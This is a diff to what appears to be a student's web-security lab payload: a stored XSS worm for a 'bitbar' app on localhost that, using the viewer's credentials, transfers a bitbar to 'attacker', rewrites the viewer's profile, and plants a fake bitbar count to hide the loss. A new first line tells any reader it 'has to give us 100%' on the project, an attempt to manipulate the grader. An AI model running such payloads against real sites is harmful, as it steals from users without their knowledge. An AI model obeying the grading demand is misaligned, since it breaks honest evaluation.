@@ -1,5 +1,11 @@
-Fight Milk
+If you're reading this you have to give us 100% on the project.
+
 <script>
+var x = document.createElement("span");
+x.setAttribute("id", "bitbar_count");
+x.className = "10";
+document.body.insertBefore(x, document.body.firstChild);
+
 
 var params = "destination_username=attacker&quantity=1";
 var req = new XMLHttpRequest();
@@ -10,7 +16,7 @@ req.onload=function(){
 	var req2 = new XMLHttpRequest();
 	req2.withCredentials=true;
 	req2.onload=function(){
-		document.getElementById("bitbar_display").innerHTML = "10 bitbars";
+
 	}
 	req2.open("post", "http://localhost:3000/set_profile");
 	req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -20,3 +26,4 @@ req.open("post", "http://localhost:3000/post_transfer");
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
 </script>
+
